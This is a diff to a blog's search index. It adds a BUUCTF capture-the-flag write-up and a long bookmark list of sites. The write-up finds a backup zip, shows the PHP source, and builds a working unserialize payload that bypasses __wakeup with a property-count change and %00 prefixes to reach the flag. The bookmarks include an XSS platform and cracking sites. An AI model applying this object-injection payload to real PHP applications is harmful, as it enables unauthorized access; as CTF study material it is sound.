@@ -1525,4 +1525,1161 @@ index<span class="token punctuation">.</span>php</code></pre>
         <tag>攻防世界</tag>
       </tags>
   </entry>
+  <entry>
+    <title>极客大挑战_2019 PHP</title>
+    <url>/2021/03/08/ji-ke-da-tiao-zhan-2019-php/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面提示<code>我有一个良好的备份网站的习惯</code></p>
+<p>找一个备份的字典扫扫网站目录</p>
+<p><img src="https://s3.ax1x.com/2021/03/08/61ZBrD.png" alt="61ZBrD.png"></p>
+<p>下载这个压缩包<code>www.zip</code></p>
+<p>有几个文件</p>
+<p>class.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
+
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>index.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span>
+    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token delimiter">?></span></code></pre>
+<p><code>unserialize</code>很明显这是一个反序列化漏洞</p>
+<p><code>echo $flag</code>条件是<code>username === &#39;admin&#39; and password == 100</code></p>
+<p>生成序列化</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'100'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
+
+<span class="token comment" spellcheck="true">//得到O:4:"Name":2:&amp;#123;s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";&amp;#125;</span></code></pre>
+<p>为了绕过<code>__wakeup</code>,执行<code>__destruct</code>,将2改成3，原理：变量个数大于原来的</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">" Name username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">" Name password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+<p>注意这里面有几个空格，把它换成%00，原理：私有变量前需要加个前缀0</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+<p>最终payload</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>select<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>site</title>
+    <url>/2021/03/08/site/</url>
+    <content><![CDATA[<h1 id="Study-学习"><a href="#Study-学习" class="headerlink" title="Study_学习"></a>Study_学习</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>慕课（MOOC）</td>
+<td><a href="https://www.icourse163.org/">https://www.icourse163.org/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>安界网</td>
+<td><a href="https://www.ajsafe.com/">https://www.ajsafe.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>万门大学</td>
+<td><a href="https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1">https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1</a></td>
+<td></td>
+</tr>
+<tr>
+<td>时宜搜书</td>
+<td><a href="https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1">https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1</a></td>
+<td></td>
+</tr>
+<tr>
+<td>oeasy</td>
+<td><a href="http://oeasy.org/">http://oeasy.org/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>epubee电子书</td>
+<td><a href="http://cn.epubee.com/books/">http://cn.epubee.com/books/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>鸠摩搜书</td>
+<td><a href="https://www.jiumodiary.com/">https://www.jiumodiary.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>考试酷</td>
+<td><a href="https://www.examcoo.com/index/ku">https://www.examcoo.com/index/ku</a></td>
+<td></td>
+</tr>
+<tr>
+<td>我要自学网</td>
+<td><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>春秋</td>
+<td><a href="https://www.ichunqiu.com/">https://www.ichunqiu.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>简搜题</td>
+<td><a href="https://www.jiansouti.com/">https://www.jiansouti.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>网考网</td>
+<td><a href="https://www.netkao.com/">https://www.netkao.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>优学优考网</td>
+<td><a href="http://www.yxykw.com/">http://www.yxykw.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSDN</td>
+<td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>博客园</td>
+<td><a href="https://www.cnblogs.com/">https://www.cnblogs.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>GitHub</td>
+<td><a href="https://github.com/">https://github.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>菜鸟教程</td>
+<td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>吾爱破解</td>
+<td><a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>stackoverflow</td>
+<td><a href="https://stackoverflow.com/">https://stackoverflow.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>w3school</td>
+<td><a href="https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>C语言</td>
+<td><a href="https://www.dotcpp.com/">https://www.dotcpp.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>慕课网</td>
+<td><a href="https://www.imooc.com/">https://www.imooc.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>lib4dev</td>
+<td><a href="http://www.lib4dev.in/">http://www.lib4dev.in/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>掘金</td>
+<td><a href="https://juejin.im/">https://juejin.im/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>oschina</td>
+<td><a href="https://www.oschina.net/?refresh">https://www.oschina.net/?refresh</a></td>
+<td></td>
+</tr>
+<tr>
+<td>老白（博客）</td>
+<td><a href="https://oo0.bid/">https://oo0.bid/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>资源素材站</td>
+<td><a href="http://www.fxrcxjq.com/">http://www.fxrcxjq.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>资源干货站</td>
+<td><a href="http://xgp123.cn/">http://xgp123.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>MSDN</td>
+<td><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>CTF</td>
+<td><a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>CTF wiki</td>
+<td><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>黑吧安全网</td>
+<td><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>三叶草</td>
+<td><a href="https://syc-2019--fxxy.repl.co/source/web.html">https://syc-2019--fxxy.repl.co/source/web.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Go破解</td>
+<td><a href="https://www.gopojie.net/">https://www.gopojie.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>黑马程序员</td>
+<td><a href="http://yun.itheima.com/">http://yun.itheima.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>51cto</td>
+<td><a href="https://edu.51cto.com/">https://edu.51cto.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>脚本之家</td>
+<td><a href="https://www.jb51.net/">https://www.jb51.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>xss平台</td>
+<td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td>
+<td></td>
+</tr>
+<tr>
+<td>sourceforge</td>
+<td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>md5</td>
+<td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="图库"><a href="#图库" class="headerlink" title="图库"></a>图库</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>wallhere</td>
+<td><a href="https://wallhere.com/">https://wallhere.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>konachan</td>
+<td><a href="https://konachan.net/">https://konachan.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>pixivic</td>
+<td><a href="https://pixivic.com/?VNK=1671e864">https://pixivic.com/?VNK=1671e864</a></td>
+<td></td>
+</tr>
+<tr>
+<td>C站</td>
+<td><a href="https://cosz.net/">https://cosz.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>彼岸图库</td>
+<td><a href="http://pic.netbian.com/">http://pic.netbian.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>图虫</td>
+<td><a href="https://tuchong.com/">https://tuchong.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>电脑壁纸</td>
+<td><a href="http://nav.6soluo.com/pic/">http://nav.6soluo.com/pic/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>wallhaven</td>
+<td><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Pixiv</td>
+<td><a href="https://m.pixivic.com/dailyRank?VNK=beec565f">https://m.pixivic.com/dailyRank?VNK=beec565f</a></td>
+<td></td>
+</tr>
+<tr>
+<td>wallpapercave</td>
+<td><a href="https://wallpapercave.com/">https://wallpapercave.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>千叶</td>
+<td><a href="http://qianye88.com/">http://qianye88.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>极简壁纸</td>
+<td><a href="https://bz.zzzmh.cn/">https://bz.zzzmh.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>ACG</td>
+<td><a href="https://2046xpro.com/">https://2046xpro.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>图片</td>
+<td><a href="https://www.mikuclub.org/">https://www.mikuclub.org/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>壁次元</td>
+<td><a href="https://www.biacgn.com/">https://www.biacgn.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>大图库</td>
+<td><a href="http://123.meibp.com/">http://123.meibp.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>大叔心</td>
+<td><a href="https://www.dashuxin.com/">https://www.dashuxin.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="学校（）"><a href="#学校（）" class="headerlink" title="学校（）"></a>学校（）</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ICC</td>
+<td><a href="http://icc.hep.com.cn/getSystemDepartmentPortal.action">http://icc.hep.com.cn/getSystemDepartmentPortal.action</a></td>
+<td></td>
+</tr>
+<tr>
+<td>学习通（个人）</td>
+<td><a href="http://i.chaoxing.com/">http://i.chaoxing.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>学习通</td>
+<td><a href="http://www.xuexi365.com/">http://www.xuexi365.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>近代史</td>
+<td><a href="https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html">https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td>WE learn</td>
+<td><a href="https://course.sflep.com/">https://course.sflep.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>智慧树</td>
+<td><a href="https://www.zhihuishu.com/">https://www.zhihuishu.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>雨课堂</td>
+<td><a href="https://www.yuketang.cn/web">https://www.yuketang.cn/web</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>爱资料在线工具</td>
+<td><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>极简插件</td>
+<td><a href="https://chrome.zzzmh.cn/">https://chrome.zzzmh.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>便捷工具</td>
+<td><a href="https://shulijp.com/">https://shulijp.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>蓝调</td>
+<td><a href="http://www.lcoc.top/">http://www.lcoc.top/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>短视频解析</td>
+<td><a href="http://jx.xueshi.pro/">http://jx.xueshi.pro/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>精准云工具</td>
+<td><a href="https://jingzhunyun.com/">https://jingzhunyun.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>搞定设计</td>
+<td><a href="https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao">https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao</a></td>
+<td></td>
+</tr>
+<tr>
+<td>一个工具箱</td>
+<td><a href="http://www.atoolbox.net/">http://www.atoolbox.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>合集网</td>
+<td><a href="http://www.heji.ltd/">http://www.heji.ltd/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>创造者日报</td>
+<td><a href="https://creatorsdaily.com/">https://creatorsdaily.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>在线工具</td>
+<td><a href="https://tool.lu/">https://tool.lu/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>兔二工具箱</td>
+<td><a href="https://www.tool22.com/">https://www.tool22.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>优聚集</td>
+<td><a href="https://ujuji.com/">https://ujuji.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>KIM</td>
+<td><a href="https://kim.plopco.com/">https://kim.plopco.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>今日热榜</td>
+<td><a href="https://tophub.today/c/ent">https://tophub.today/c/ent</a></td>
+<td></td>
+</tr>
+<tr>
+<td>AnyKnew</td>
+<td><a href="https://www.anyknew.com/#/">https://www.anyknew.com/#/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>牛导航</td>
+<td><a href="http://www.ziliao6.com/">http://www.ziliao6.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>沃克导航</td>
+<td><a href="http://www.waysto.work/">http://www.waysto.work/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>站长啦网站目录</td>
+<td><a href="http://top.cnzzla.com/">http://top.cnzzla.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>AnywhereAnything</td>
+<td><a href="http://lackar.com/aa/">http://lackar.com/aa/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>老司机导航</td>
+<td><a href="http://www.giffox.com/">http://www.giffox.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>广告创意文案</td>
+<td><a href="https://www.addog.vip/">https://www.addog.vip/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>产品经理导航</td>
+<td><a href="https://dh.woshipm.com/#section-1">https://dh.woshipm.com/#section-1</a></td>
+<td></td>
+</tr>
+<tr>
+<td>考拉新媒体导航</td>
+<td><a href="https://www.kaolamedia.com/">https://www.kaolamedia.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>国外网站大全</td>
+<td><a href="http://www.world68.com/">http://www.world68.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>合集网</td>
+<td><a href="https://www.heji.ltd/">https://www.heji.ltd/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>龙轩</td>
+<td><a href="http://ilxdh.com/">http://ilxdh.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>小田田</td>
+<td><a href="https://xydh.fun/xiaotiantian">https://xydh.fun/xiaotiantian</a></td>
+<td></td>
+</tr>
+<tr>
+<td>工具达人</td>
+<td><a href="https://dartools.com/">https://dartools.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="磁力"><a href="#磁力" class="headerlink" title="磁力"></a>磁力</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>小白种草</td>
+<td><a href="https://wx.gzlpx.com.cn/">https://wx.gzlpx.com.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>超能搜</td>
+<td><a href="http://www.chaonengsou.com/">http://www.chaonengsou.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>罗马盘</td>
+<td><a href="https://www.luomapan.com/">https://www.luomapan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>快搜</td>
+<td><a href="https://search.chongbuluo.com/#nyaso">https://search.chongbuluo.com/#nyaso</a></td>
+<td></td>
+</tr>
+<tr>
+<td>酷搜</td>
+<td><a href="https://www.kolsou.com/">https://www.kolsou.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>优聚集</td>
+<td><a href="http://hao.ujuji.com/#/">http://hao.ujuji.com/#/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>小昭来啦</td>
+<td><a href="https://www.xiaozhaolaila.com/">https://www.xiaozhaolaila.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>小可搜搜</td>
+<td><a href="https://www.xiaokesoso.com/">https://www.xiaokesoso.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>大力盘</td>
+<td><a href="https://www.dalipan.com/">https://www.dalipan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>尘心聚搜索</td>
+<td><a href="https://pan.ischenxin.com/">https://pan.ischenxin.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>西瓜搜</td>
+<td><a href="http://www.xgsoso.com/">http://www.xgsoso.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>蓝奏搜</td>
+<td><a href="https://www.xqxianbao.com/lzys/">https://www.xqxianbao.com/lzys/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>大圣盘</td>
+<td><a href="https://www.dashengpan.com/">https://www.dashengpan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>云盘精灵</td>
+<td><a href="https://www.yunpanjingling.com/">https://www.yunpanjingling.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>云铺子</td>
+<td><a href="http://www.yunpz.net/">http://www.yunpz.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>呆河马</td>
+<td><a href="http://www.daihema.com/">http://www.daihema.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>盘天下</td>
+<td><a href="https://www.pantianxia.com/">https://www.pantianxia.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>小白盘</td>
+<td><a href="https://www.xiaobaipan.com/">https://www.xiaobaipan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>易破解</td>
+<td><a href="https://www.ypojie.com/">https://www.ypojie.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>去转盘</td>
+<td><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>巴士搜索</td>
+<td><a href="http://bashi5.org/">http://bashi5.org/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>yamadie</td>
+<td><a href="https://yamadie.net/">https://yamadie.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>ttdva</td>
+<td><a href="http://www.ttdva.com/">http://www.ttdva.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>求资源</td>
+<td><a href="https://www.qiuziyuan.net/">https://www.qiuziyuan.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>阿萨姆软件</td>
+<td><a href="https://www.sssam.com/">https://www.sssam.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>大白软件站</td>
+<td><a href="https://win.o--o.win/">https://win.o--o.win/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>MT</td>
+<td><a href="http://mt.indabai.com/">http://mt.indabai.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>无解搜</td>
+<td><a href="http://wujiesou.com/">http://wujiesou.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>懒盘</td>
+<td><a href="https://www.lzpan.com/">https://www.lzpan.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="专业（企业）"><a href="#专业（企业）" class="headerlink" title="专业（企业）"></a>专业（企业）</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>华为云直播</td>
+<td><a href="https://bbs.huaweicloud.com/webinar">https://bbs.huaweicloud.com/webinar</a></td>
+<td></td>
+</tr>
+<tr>
+<td>360网络安全学院</td>
+<td><a href="https://university.360.cn/">https://university.360.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>华为高校系列</td>
+<td><a href="https://huaweicloud.bugu.mudu.tv/watch/lm06j3em">https://huaweicloud.bugu.mudu.tv/watch/lm06j3em</a></td>
